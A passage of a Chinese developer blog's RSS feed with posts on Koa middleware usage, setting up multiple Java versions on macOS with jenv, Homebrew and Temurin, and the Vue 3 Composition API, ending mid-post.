<p><a href="https://github.com/koajs/compose/blob/master/index.js">koajs/compose</a> &#x6A21;&#x5757;&#x5B9E;&#x73B0;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6267;&#x884C;&#x3002;<code>dispatch(0)</code> &#x7684;&#x6267;&#x884C;&#x8868;&#x793A;&#x9996;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x51FD;&#x6570; fn &#x53D6; middleware[0]&#x3002;middleware &#x6570;&#x7EC4;&#x7EF4;&#x62A4;&#x7684;&#x662F;&#x901A;&#x8FC7; <code>app.use()</code> &#x538B;&#x5165;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;&#x4E2D;&#x95F4;&#x4EF6;&#x6267;&#x884C;&#x65F6;&#x7684;&#x4F20;&#x53C2;&#x5206;&#x522B;&#x662F;&#x4E0A;&#x4E0B;&#x6587;&#x548C; next&#x3002;</p>
<p><code>next()</code> &#x6267;&#x884C;&#x5373;&#x662F;&#x8C03;&#x7528; <code>dispatch(i)</code> &#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x9047;&#x89C1;&#x51FD;&#x6570; next &#x7684;&#x903B;&#x8F91;&#x662F;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;</p>
<ul>
<li>Middleware =&gt; <a href="https://github.com/koajs/router/blob/master/API.md">koa-router</a></li>
</ul>
<pre><code class="language-shell">$ npm install @koa/router
</code></pre>
<pre><code class="language-javascript">const Koa = require(&apos;koa&apos;);
const Router = require(&apos;@koa/router&apos;);
const app = new Koa();
const router = new Router();
router.get(&apos;/&apos;, async (ctx, next) =&gt; {
  console.log(&quot;@koa/router get request =&gt; &quot;,`${ctx.method} ${ctx.url}`)
  ctx.body = &apos;Hello World&apos;;
  await next();
});
app.use(router.routes()).use(router.allowedMethods());
app.listen(3000);
</code></pre>
<ul>
<li>Middleware =&gt; <a href="https://www.npmjs.com/package/koa-bodyparser">koa-bodyparser</a></li>
</ul>
<p>Koa &#x662F;&#x5148;&#x7ECF;&#x8FC7;&#x4E1A;&#x52A1;&#x8DEF;&#x7531;&#xFF0C;&#x518D;&#x5904;&#x7406;&#x4E2D;&#x95F4;&#x4EF6;&#xFF1B;&#x800C; Express &#x662F;&#x5148;&#x7ECF;&#x8FC7;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x4E2D;&#x95F4;&#x4EF6;&#x9A8C;&#x8BC1;&#x4E0D;&#x901A;&#x8FC7;&#x5C31;&#x4E0D;&#x4F1A;&#x5904;&#x7406;&#x4E1A;&#x52A1;&#x3002;<code>app.use(bodyParser());</code> &#x653E;&#x5728;&#x8DEF;&#x7531;&#x5904;&#x7406;&#x4E4B;&#x524D;&#x3002;</p>
<pre><code class="language-shell">$ npm install koa-bodyparser
</code></pre>
<ul>
<li>Middleware =&gt; <a href="https://www.npmjs.com/package/@koa/cors">@koa/cors</a></li>
</ul>
<p>@koa/cors &#x6839;&#x636E;&#x7B80;&#x5355;&#x8BF7;&#x6C42;&#x3001;&#x9884;&#x68C0;&#x8BF7;&#x6C42;&#x5206;&#x522B;&#x5BF9; CORS &#x5934;&#x8FDB;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x3002;</p>
<pre><code class="language-shell">$ npm install @koa/cors --save
</code></pre>
<pre><code class="language-javascript">// &#x7ED3;&#x5408; @koa/cors &#x4E0E; koa-bodyParser
var Koa = require(&apos;koa&apos;);
const cors = require(&apos;koa-cors&apos;);
var bodyParser = require(&apos;koa-bodyparser&apos;); // &#x83B7;&#x53D6;post&#x8BF7;&#x6C42;&#x7684;&#x53C2;&#x6570;
var app = new Koa();
app.use(bodyParser()).use(cors());

app.use(async ctx =&gt; {
  // the parsed body will store in ctx.request.body
  // if nothing was parsed, body will be an empty object {}
  ctx.body = ctx.request.body;
});

app.listen(3000);
</code></pre>
<ul>
<li>Middleware =&gt; <a href="https://www.npmjs.com/package/koa-static">koa-static</a> &amp; <a href="https://www.npmjs.com/package/koa-mount">koa-mount</a></li>
</ul>
<pre><code class="language-shell">$ npm install koa-static
$ npm install koa-mount
</code></pre>
<pre><code class="language-javascript">const Koa = require(&quot;koa&quot;);
const path = require(&quot;path&quot;);
const server = require(&quot;koa-static&quot;); // &#x642D;&#x5EFA;&#x9759;&#x6001;&#x670D;&#x52A1;
const mount = require(&quot;koa-mount&quot;); // &#x6307;&#x5B9A;&#x9759;&#x6001;&#x670D;&#x52A1;&#x7684;&#x8BF7;&#x6C42;&#x524D;&#x7F00;
let app = new Koa();

const staticPath = path.resolve(__dirname, &quot;static&quot;);
const staticServer = server(staticPath, {
  setHeaders: (res, path, stats) =&gt; {
    if (path.indexOf(/[jpg|png|gif|jpeg]/) !== -1) {
      console.log(stats);
      res.setHeader(&quot;Cache-Control&quot;, [&quot;private&quot;, &quot;max-age=60&quot;]);
      res.setHeader(&quot;Test-Static-Stats-Birthtime&quot;, stats.birthtime); // &#x81EA;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x5934;
    }
  },
});

app.use(mount(&quot;/supdir&quot;, staticServer));
app.listen(3000);
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="third-party-modules">Third Party Modules</h2>
<h3 id="project-development">project development</h3>
<h3 id="analysis-test">analysis test</h3>
<ul>
<li><a href="https://www.npmjs.com/package/esprima">esprima</a> =&gt; &#x5BF9; JavaScript &#x505A;&#x8BCD;&#x6CD5;&#x6216;&#x8BED;&#x6CD5;&#x5206;&#x6790;&#x7684;&#x5DE5;&#x5177; -&gt; <a href="https://esprima.org/demo/parse.html">online site</a></li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[jenv => Java Environment]]></title><description><![CDATA[Use jenv set up multiple Java Environment.]]></description><link>yourdomain.com/jenv/</link><guid isPermaLink="false">614ccdb5f7263c9315a75845</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sat, 19 Jun 2021 08:48:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/07/Gundam.jpeg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="bye-adoptopenjdk-hello-adoptium">Bye AdoptOpenJDK, Hello Adoptium!</h3>
<ul>
<li>Open JDK</li>
</ul>
<img src="yourdomain.com/content/images/2022/07/Gundam.jpeg" alt="jenv =&gt; Java Environment"><p>&#x5F53;&#x4E0B; Java &#x5F00;&#x53D1;&#x662F;&#x7531; Oracle &#x4E3B;&#x5BFC;&#xFF0C;&#x4EE5; OpenJDK &#x5F00;&#x6E90;&#x9879;&#x76EE;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x3002;Oracle &#x548C;&#x793E;&#x533A;&#x63D0;&#x4F9B;&#x7684; OpenJDK &#x5206;&#x522B;&#x79F0;&#x4E3A; Oracle&apos;s OpenJDK &#x548C; <a href="https://adoptopenjdk.net/?variant=openjdk8&amp;jvmVariant=hotspot">AdoptOpenJDK</a>&#x3002;</p>
<p>OracleJDK &#x53EA;&#x63D0;&#x4F9B; 6 &#x4E2A;&#x6708;&#x7684;&#x5B89;&#x5168;&#x66F4;&#x65B0;&#x670D;&#x52A1;&#x7ED9; Oracle&#x2019;s OpenJDK&#xFF0C;AdoptOpenJDK &#x5219;&#x5BF9; OpenJDK &#x63D0;&#x4F9B;&#x56DB;&#x5E74;&#x7684;&#x957F;&#x671F;&#x652F;&#x6301;&#x7248;&#x672C; LTS&#x3002;</p>
<ul>
<li>Temurin</li>
</ul>
<p>Homebrew&apos;s AdoptOpenJDK &#x6700;&#x9AD8;&#x53EA;&#x5230; 16&#xFF0C;&#x540E;&#x7EED;&#x7684;&#x5F00;&#x53D1;&#x5DF2;&#x4ECE; AdoptOpenJDK &#x8FC1;&#x79FB;&#x5230; Eclipse Adoptium&#x3002;Eclipse &#x57FA;&#x91D1;&#x4F1A;&#x7684; Adoptium &#x63D0;&#x4F9B; Java &#x751F;&#x6001;&#x7CFB;&#x7EDF;&#x548C;&#x8FD0;&#x884C;&#x65F6;&#x7684;&#x76F8;&#x5173;&#x6280;&#x672F;&#xFF0C;&#x5176;&#x5B50;&#x9879;&#x76EE; Eclipse Temurin &#x662F;&#x57FA;&#x4E8E; OpenJDK &#x7684;&#x5F00;&#x6E90; JavaSE &#x6784;&#x5EFA;&#x3002;</p>
<h3 id="%E7%A0%B4%E6%97%A7%E7%AB%8B%E6%96%B0">&#x7834;&#x65E7;&#x7ACB;&#x65B0;</h3>
<ul>
<li>&#x5378;&#x8F7D; AdoptOpenJDK</li>
</ul>
<p>&#x7EC8;&#x7AEF;&#x67E5;&#x770B;&#x5B89;&#x88C5;&#x7684; JDK &#x7248;&#x672C;&#xFF0C;&#x5E76;&#x4EE5;&#x7BA1;&#x7406;&#x5458;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x5378;&#x8F7D;&#xFF0C;&#x968F;&#x540E;&#x5C06; ~/.zshrc &#x4E2D;&#x7684;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x6CE8;&#x91CA;&#x3002;</p>
<p>&#x4EE5; Homebrew &#x5378;&#x8F7D;&#x65F6;&#x8981;&#x5C06; untap &#x64CD;&#x4F5C;&#x7F6E;&#x4E8E;&#x6700;&#x540E;&#x6267;&#x884C;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0; Error: Refusing to untap adoptopenjdk/openjdk because it contains the installed formulae...</p>
<p>&#x82E5;&#x4E0D;&#x662F;&#x901A;&#x8FC7; Homebrew &#x5B89;&#x88C5;&#x7684; JDK&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x63D0;&#x793A; Error: Cask &apos;adoptopenjdk16&apos; is not installed. =&gt; &#x53EA;&#x8981;&#x5C06; Homebrew &#x5B89;&#x88C5;&#x7684;&#x5378;&#x8F7D;&#x5E72;&#x51C0;&#x5373;&#x53EF; untap&#x3002;</p>
<pre><code class="language-shell"># &#x65B9;&#x5F0F;&#x4E00; =&gt;
$ ls /Library/Java/JavaVirtualMachines/ # &#x666E;&#x904D; Java &#x5B89;&#x88C5;&#x5B58;&#x653E;&#x4F4D;&#x7F6E;
jdk-11.0.11.jdk
$ sudo rm -rf /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk
# &#x65B9;&#x5F0F;&#x4E8C; =&gt;
$ brew remove --cask adoptopenjdk8 # &#x5378;&#x8F7D; adoptopenjdk
$ brew untap AdoptOpenJDK/openjdk # untap =&gt; &#x907F;&#x514D; Error: Cask xxx exists in multiple taps
</code></pre>
<ul>
<li>&#x5B89;&#x88C5; Temurin</li>
</ul>
<pre><code class="language-shell">$ brew tap homebrew/cask-versions # tap &#x80FD;&#x6269;&#x5927; casks &#x8303;&#x56F4;
$ brew install -- cask temurin8 # &#x4F4D;&#x7F6E; =&gt; /Library/Java/JavaVirtualMachines/
</code></pre>
<ul>
<li>&#x5B89;&#x88C5; <a href="https://github.com/jenv/jenv">jenv</a> =&gt; &#x53EF;&#x80FD;&#x5C06;&#x5B58;&#x5728;&#x7684; iterm2 &#x914D;&#x7F6E;&#x635F;&#x574F;</li>
</ul>
<p>&#x6839;&#x636E; <code>jenv doctor</code> &#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x53EF;&#x89C2;&#x5BDF;&#x5230; jenv &#x5DF2;&#x6B63;&#x786E;&#x52A0;&#x8F7D;&#x4F46;&#x5C1A;&#x672A;&#x5B89;&#x88C5; Java</p>
<pre><code class="language-shell">$ mkdir ~/.jenv # Create Dir =&gt; &#x5B98;&#x65B9;&#x6307;&#x5BFC;&#x6CA1;&#x6709;&#x8FD9;&#x4E00;&#x6B65;
$ brew install jenv
$ jenv doctor # To verify jenv was installed =&gt; &#x4E0B;&#x65B9;&#x4EE3;&#x7801;&#x662F;&#x6B63;&#x786E;&#x60C5;&#x51B5;
[OK]	No JAVA_HOME set
[ERROR]	Java binary in path is not in the jenv shims.
[ERROR]	Please check your path, or try using /path/to/java/home is not a valid path to java installation.
	PATH : /.../.../:/.../.../:/.../.../:/.../.../:/.../.../:/.../.../...
[OK]	Jenv is correctly loaded
</code></pre>
<p>&#x82E5;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x60C5;&#x51B5;&#x5219;&#x8868;&#x793A;&#x5B58;&#x5728;&#x914D;&#x7F6E;&#x540D;&#x5360;&#x7528; =&gt; &#x9700;&#x8981;&#x5378;&#x8F7D; jdk</p>
<pre><code class="language-shell">[ERROR] JAVA_HOME variable already set, scripts that use it directly could not use java version set by jenv [ERROR] Java binary in path is not in the jenv shims. 
</code></pre>
<p>&#x786E;&#x4FDD; JAVA_HOME &#x5DF2;&#x8BBE;&#x7F6E;&#xFF0C;&#x5E94;&#x786E;&#x4FDD;&#x542F;&#x7528; export &#x63D2;&#x4EF6;&#xFF08;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x53EF;&#x5FFD;&#x7565;&#x8FD9;&#x4E00;&#x6B65;&#xFF09;</p>
<pre><code class="language-shell">$ jenv enable-plugin export
$ exec $SHELL -l
</code></pre>
<ul>
<li>&#x6DFB;&#x52A0; Java &#x73AF;&#x5883;</li>
</ul>
<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F53;&#x524D;&#x73AF;&#x5883;&#x6700;&#x65B0;&#x7248;&#x672C;&#x7684; Java &#x662F; system &#x5728; macOS &#x4E0A;&#x7684;&#x9ED8;&#x8BA4;&#x7248;&#x672C;&#x3002;&#x901A;&#x8FC7; jenv local VERSION &#x53EF;&#x4EE5;&#x4E3A;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x672C;&#x5730; Java &#x7248;&#x672C;&#x3002;&#x540C;&#x65F6;&#x4F1A;&#x4F34;&#x751F;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; .java-version &#x6587;&#x4EF6;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x9879;&#x76EE;&#x68C0;&#x5165; Git&#xFF0C;&#x4E14;&#x542F;&#x52A8; shell &#x65F6;&#x8BA9; jenv &#x786E;&#x4FDD;&#x52A0;&#x8F7D;&#x6B64; java&#x3002;</p>
<pre><code class="language-shell"># &#x6CE8;&#x610F;&#x901A;&#x8FC7; brew &#x5B89;&#x88C5;&#x7684; jdk &#x5B58;&#x5728;&#x4E8E; /usr/local/Cellar/... =&gt; &#x5DF2;&#x8FC7;&#x65F6;
$ jenv add /usr/local/Cellar/openjdk@11/11.0.12
11.0.12 added
11.0 added
11 added
$ brew install openjdk@8
$ jenv add /usr/local/Cellar/openjdk@8/1.8.0+302
...
# 2022/03/03 &#x66F4;&#x65B0; =&gt; /Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home
# Home &#x7ED3;&#x675F; =&gt; &#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0; $PATH is not a valid path to java installation &#x7684; Error
$ jenv add /Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home
openjdk64-11.0.12 added
temurin64-1.8.0.332 added
1.8.0.332 added
1.8 added
1.8.0.332 already present, skip installation
$ jenv doctor # &#x68C0;&#x67E5; jenv &#x663E;&#x793A;&#x6B63;&#x786E;                          
[OK]	JAVA_HOME variable probably set by jenv PROMPT
[OK]	Java binaries in path are jenv shims
[OK]	Jenv is correctly loaded
$ brew install -- cask temurin11
$ jenv add /Library/Java/JavaVirtualMachines/temurin-11.jdk/Contents/Home
$ brew install -- cask temurin17
$ jenv add /Library/Java/JavaVirtualMachines/temurin-17.jdk/Contents/Home
</code></pre>
<ul>
<li>&#x5F00;&#x53D1;&#x7248;&#x672C;&#x914D;&#x7F6E;</li>
</ul>
<p>&#x914D;&#x7F6E;&#x65B9;&#x9762;&#x9664;&#x5F00;&#x7248;&#x672C;&#x540D;&#x5916;&#x5E76;&#x65E0;&#x660E;&#x663E;&#x64CD;&#x4F5C;&#x533A;&#x522B;&#xFF0C;&#x672C;&#x6BB5;&#x8FC7;&#x7A0B;&#x4EE5;&#x65E7;&#x7248;&#x672C; openjdk &#x4E3A;&#x4E3B;&#x3002;</p>
<pre><code class="language-shell">$ jenv versions # View Java environment version list
* system (set by /Users/zsxzy/.jenv/version) # &#x65E7;&#x7248;&#x672C; =&gt; &#x5E9F;&#x5F03;
  1.8
  1.8.0.302
  11
  11.0
  11.0.12
  openjdk64-1.8.0.302
  openjdk64-11.0.12
</code></pre>
<pre><code class="language-shell">$ jenv local 1.8.0.302 # Java environment selection
$ exec $SHELL -l # Java environment selection
$ cat .java-version # Java environment selection
1.8.0.302
$ echo ${JAVA_HOME} # Check if it is set
/Users/zsxzy/.jenv/versions/1.8.0.302
$ jenv global 1.8.0.302 # Global Java version settings
$ java -version
openjdk version &quot;1.8.0_302&quot;
OpenJDK Runtime Environment (build 1.8.0_302-bre_2021_08_14_21_34-b00)
OpenJDK 64-Bit Server VM (build 25.302-b00, mixed mode)
</code></pre>
<pre><code class="language-shell"># Shell Java version setting
$ jenv shell 11 # &#x5F53;&#x524D; shell &#x4F1A;&#x8BDD;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x8BBE;&#x7F6E;&#x7684; Java
$ jenv which java # &#x663E;&#x793A;&#x53EF;&#x6267;&#x884C;&#x7684; Java &#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;
$ rm .java-version # Delete .java -version which u don&apos;t need
</code></pre>
<p>&#x5728;&#x8BBE;&#x7F6E;&#x5B8C; Java &#x7248;&#x672C;&#x540E;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; Java8 &#x7684; java -version &#x6216; Java 9+ &#x7684; java --version &#x67E5;&#x770B;&#x7248;&#x672C;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E8%A1%A5%E6%BC%8F%E8%AE%A2%E8%AE%B9">&#x8865;&#x6F0F;&#x8BA2;&#x8BB9;</h2>
<h3 id="adoptopenjdk-%E4%B8%8E-tap">AdoptOpenJDK &#x4E0E; tap</h3>
<p>Homebrew &#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x4ED3;&#x5E93; Formulae &#x4E0E; Casks&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; tap &#x6307;&#x4EE4;&#x6DFB;&#x52A0;&#x66F4;&#x591A;&#x4ED3;&#x5E93;&#xFF0C;search &#x5230;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5BB9;&#x3002;<a href="https://github.com/AdoptOpenJDK/homebrew-openjdk">OpenJDK releases</a> &#x9700;&#x8981;&#x5728; tap &#x4E2D;&#x67E5;&#x770B;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x662F;&#x4ECE; brew casks &#x4E2D;&#x5206;&#x79BB;&#x7684;&#x90E8;&#x5206;&#x3002;&#x901A;&#x8FC7; brew tap add &#x6307;&#x5B9A;&#x4ED3;&#x5E93;&#x8FDB;&#x884C;&#x6DFB;&#x52A0;&#x3002;</p>
<pre><code class="language-shell">$ brew tap AdoptOpenJDK/openjdk
$ brew search /adoptopenjdk/
# &#x5B89;&#x88C5;&#x9700;&#x8981;&#x7684; jdk &#x7248;&#x672C;
$ brew install adoptopenjdk11
$ brew install adoptopenjdk8
# &#x6CE8;&#x518C; jenv
$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-11|8.jdk/Contents/Home
# &#x5168;&#x5C40;&#x8BBE;&#x7F6E; JDK
$ jenv global 11
# &#x6216;&#x8005;&#x5BF9;&#x4E8E;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x9879;&#x76EE;
$ cd ~/projects/my_project
$ jenv local 1.8
$ java -version
openjdk version &quot;1.8.0_202&quot;
# &#x53D6;&#x6D88;&#x7248;&#x672C;&#x8BBE;&#x7F6E;
$ jenv global system
$ cd ~/projects/my_project
$ jenv local --unset
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Vue3.x]]></title><description><![CDATA[人生若只如初見，何事秋風悲畫扇。]]></description><link>yourdomain.com/vue3/</link><guid isPermaLink="false">6162dab1583b7b9d2d04cd28</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Fri, 21 May 2021 14:22:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/10/one-piece.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<blockquote>
<img src="yourdomain.com/content/images/2021/10/one-piece.jpg" alt="Vue3.x"><p>&#x58F0;&#x660E;&#x5F0F;&#x6E32;&#x67D3; Declarative Rendering =&gt; &#x901A;&#x8FC7;&#x6A21;&#x677F;&#x8BED;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CC;&#x82B1;&#x62EC;&#x53F7;&#x4E3A;&#x5360;&#x4F4D;&#x7B26;&#x5C06;&#x6570;&#x636E;&#x63D2;&#x5165;&#x5230;&#x8282;&#x70B9;&#x3002;<br>
&#x54CD;&#x5E94;&#x6027; Responsiveness =&gt; &#x901A;&#x8FC7; Vue &#x81EA;&#x52A8;&#x8DDF;&#x8E2A; JS &#x7684;&#x72B6;&#x6001;&#x53D8;&#x5316;&#xFF0C;&#x5728;&#x5176;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#x54CD;&#x5E94;&#x5F0F;&#x5730;&#x66F4;&#x65B0; DOM&#x3002;<br>
API &#x98CE;&#x683C; API Styles =&gt; &#x9009;&#x9879;&#x5F0F; API Options API&#x3001;&#x7EC4;&#x5408;&#x5F0F; API Composition API&#x3002;</p>
</blockquote>
<h3 id="%E9%80%89%E9%A1%B9%E5%BC%8F-api-%E4%B8%8E%E7%BB%84%E5%90%88%E5%BC%8F-api"><a href="https://staging-cn.vuejs.org/guide/introduction.html#api-styles">&#x9009;&#x9879;&#x5F0F; API &#x4E0E;&#x7EC4;&#x5408;&#x5F0F; API</a></h3>
<p>Options API &#x5305;&#x542B;&#x6570;&#x636E;&#x3001;&#x65B9;&#x6CD5;&#x3001;&#x751F;&#x547D;&#x5468;&#x671F;&#x7B49;&#x9009;&#x9879;&#xFF0C;&#x4E14;&#x9009;&#x9879;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x4F1A;&#x66B4;&#x9732;&#x5728;&#x51FD;&#x6570;&#x5185;&#x90E8;&#x7684; this &#x4E0A;&#x3002;</p>
<p>&#x5C01;&#x88C5;&#x590D;&#x7528;&#x7EC4;&#x4EF6;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x89E3;&#x51B3;&#x56E0;&#x4E1A;&#x52A1;&#x5DE8;&#x5927;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x903B;&#x8F91;&#x5173;&#x6CE8;&#x70B9;&#x7684;&#x5197;&#x957F;&#xFF0C;&#x8FD9;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x5F00;&#x53D1;&#x4E2D;&#x5FC5;&#x987B;&#x4E0D;&#x65AD;&#x5730;&#x8DF3;&#x8F6C;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x7684;&#x9009;&#x9879;&#x5757;&#x3002;Composition API &#x5C06;&#x540C;&#x7C7B;&#x903B;&#x8F91;&#x5173;&#x6CE8;&#x70B9;&#x7684;&#x4EE3;&#x7801;&#x6C47;&#x805A;&#x4E8E; setup &#x7EC4;&#x4EF6;&#x9009;&#x9879;&#x3002;</p>
<p><a href="https://v3.cn.vuejs.org/api/composition-api.html">Composition API</a> &#x5E38;&#x914D;&#x5408; setup &#x51FD;&#x6570;&#x6765;&#x63CF;&#x8FF0;&#x7EC4;&#x4EF6;&#x903B;&#x8F91;&#x3002;<u>&#x56E0; setup &#x5728; beforeCreate &#x94A9;&#x5B50;&#x4E4B;&#x524D;&#x6267;&#x884C;&#xFF0C;&#x6B64;&#x65F6;&#x7684;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#x8FD8;&#x672A;&#x521B;&#x5EFA;&#xFF0C;&#x6240;&#x4EE5;&#x5728; setup &#x51FD;&#x6570;&#x4E2D;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; this&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0; undefined&#x3002;&#x6B64;&#x5916;&#x6A21;&#x677F;&#x4E2D;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x548C;&#x51FD;&#x6570;&#xFF0C;&#x5E94;&#x5728; setup &#x5185;&#x8FDB;&#x884C;&#x8FD4;&#x56DE;&#x3002;</u></p>
<p>&#x8FD9;&#x91CC;&#x5BF9; setup &#x4E2D;&#x65E0;&#x6CD5;&#x4F7F;&#x7528; this &#x518D;&#x505A;&#x6E90;&#x7801;&#x8BF4;&#x660E;&#xFF1A;</p>
<ul>
<li>&#x8C03;&#x7528; createComponentInstance &#x521B;&#x5EFA;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#xFF1B;</li>
<li>&#x8C03;&#x7528; setupComponent &#x521D;&#x59CB;&#x5316; component &#x5185;&#x90E8;&#x7684;&#x64CD;&#x4F5C;&#xFF1B;</li>
<li>&#x8C03;&#x7528; setupStatefulComponent &#x521D;&#x59CB;&#x5316;&#x6709;&#x72B6;&#x6001;&#x7684;&#x7EC4;&#x4EF6;&#xFF1B;</li>
<li>&#x5728; setupStatefulComponent &#x53D6;&#x51FA; setup &#x51FD;&#x6570;&#xFF1B;</li>
<li>&#x901A;&#x8FC7; callWithErrorHandling &#x7684;&#x51FD;&#x6570;&#x6267;&#x884C; setup&#xFF1B;</li>
</ul>
<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x53EF;&#x770B;&#x51FA;&#x7EC4;&#x4EF6;&#x7684;&#x5B9E;&#x4F8B; instance &#x80AF;&#x5B9A;&#x5728;&#x6267;&#x884C; setup &#x51FD;&#x6570;&#x4E4B;&#x524D;&#x5C31;&#x521B;&#x5EFA;&#x51FA;&#x6765;&#x3002;</p>
<pre><code class="language-ts">/* core/packages/runtime-core/src/errorHandling.ts */
export function callWithErrorHandling(
  fn: Function,
  instance: ComponentInternalInstance | null,
  type: ErrorTypes,
  args?: unknown[] // props, context
) {
  let res
  try {
    res = args ? fn(...args) : fn() // &#x672A;&#x7ED1;&#x5B9A; this
  } catch (err) {
    handleError(err, instance, type)
  }
  return res
}
</code></pre>
<p>&#x5728;&#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&#x4E2D;&#xFF0C;&#x7EC4;&#x5408;&#x5F0F; API &#x4E5F;&#x4F1A;&#x4E0E; &lt;script setup&gt; &#x642D;&#x914D;&#x4F7F;&#x7528;&#x3002;&lt;script setup&gt; &#x662F;&#x4E00;&#x79CD;<a href="https://vuejs.org/api/sfc-script-setup.html">&#x7F16;&#x8BD1;&#x65F6;&#x8BED;&#x6CD5;&#x7CD6;</a>&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x5BFC;&#x5165;&#x548C;&#x9876;&#x5C42;&#x53D8;&#x91CF;/&#x51FD;&#x6570;&#x90FD;&#x80FD;&#x591F;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x3002;setup attribute &#x4F5C;&#x4E3A; hint&#xFF0C;&#x544A;&#x8BC9; Vue &#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#xFF0C;&#x63A8;&#x8350;&#x5728; SFCs and Composition API &#x573A;&#x666F;&#x4E0B;&#x4F7F;&#x7528;&#x3002;</p>
<blockquote>
